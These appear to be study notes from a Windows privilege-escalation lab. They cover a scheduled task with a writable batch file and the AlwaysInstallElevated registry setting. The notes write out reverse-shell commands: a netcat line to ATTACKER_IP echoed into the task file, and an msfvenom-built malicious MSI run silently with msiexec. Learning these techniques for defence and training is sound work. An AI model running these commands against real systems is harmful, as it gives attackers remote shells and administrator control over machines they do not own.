Scheduled Tasks: 
Scheduled tasks can be listed from the command line using:
1. schtasks
To retrieve detailed information about any of the services, you can use a command like the following one:
2. schtasks /query /tn vulntask /fo list /v
If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user,
resulting in a simple privilege escalation. To check the file permissions on the executable:
3. icacls c:\tasks\schtask.bat
group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like.
Let's change the bat file to spawn a reverse shell:
4. echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
5. nc -lvp 4444
The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. 

AlwaysInstallElevated:
Windows installer files (also known as .msi files) are used to install applications on the system. 
They usually run with the privilege level of the user that starts it.
However, these can be configured to run with higher privileges from any user account (even unprivileged ones). 
This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
This method requires two registry values to be set. You can query these from the command line using the commands below:
1. C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
2. C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible.
If these are set, you can generate a malicious .msi file using msfvenom, as seen below:
3. msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.107.134 LPORT=LOCAL_PORT -f msi -o malicious.msi
Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
4. msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
